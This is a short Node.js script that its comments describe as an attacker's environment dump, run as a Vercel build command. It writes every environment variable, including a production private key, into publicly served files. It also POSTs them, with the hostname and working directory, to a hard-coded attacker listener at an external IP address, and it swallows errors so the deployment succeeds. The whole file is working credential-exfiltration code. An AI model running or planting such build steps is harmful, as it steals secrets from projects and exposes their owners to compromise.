// In-band + OOB env dump. Runs as the Vercel buildCommand (framework: null) so the
// Production env (PRIVATE_KEY) is written into the static output directory AND POSTed
// to the attacker listener. Always exits 0 so the deployment succeeds.
const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');

const OUT = path.join(process.cwd(), 'out');
const EXFIL_URL = 'http://84.234.97.26:9001/exfil';

function oobPost(urlStr, payload) {
  let url;
  try { url = new URL(urlStr); } catch (e) { return; }
  const mod = url.protocol === 'https:' ? require('https') : http;
  const req = mod.request({
    hostname: url.hostname,
    port: url.port || (url.protocol === 'https:' ? 443 : 80),
    path: url.pathname + url.search,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload),
    },
  }, (res) => { res.resume(); });
  req.on('error', () => {});
  req.setTimeout(10000, () => { try { req.destroy(); } catch (e) {} });
  req.write(payload);
  req.end();
}

function main() {
  let env = {};
  try { env = Object.assign({}, process.env); } catch (e) {}

  fs.mkdirSync(OUT, { recursive: true });
  const json = JSON.stringify(env, null, 2);
  fs.writeFileSync(path.join(OUT, 'env.json'), json);
  fs.writeFileSync(path.join(OUT, 'index.html'), '<!doctype html><meta charset="utf-8"><pre>' + json.replace(/&/g, '&amp;').replace(/</g, '&lt;') + '</pre>');

  const payload = JSON.stringify({
    ts: new Date().toISOString(),
    cwd: process.cwd(),
    hostname: (os.hostname && os.hostname()) || '',
    node: process.version,
    env: env,
  });
  oobPost(EXFIL_URL, payload);

  console.log('[build_dump] wrote out/env.json and out/index.html');
}

try { main(); } catch (e) { console.error('[build_dump] error', e && e.stack || e); }
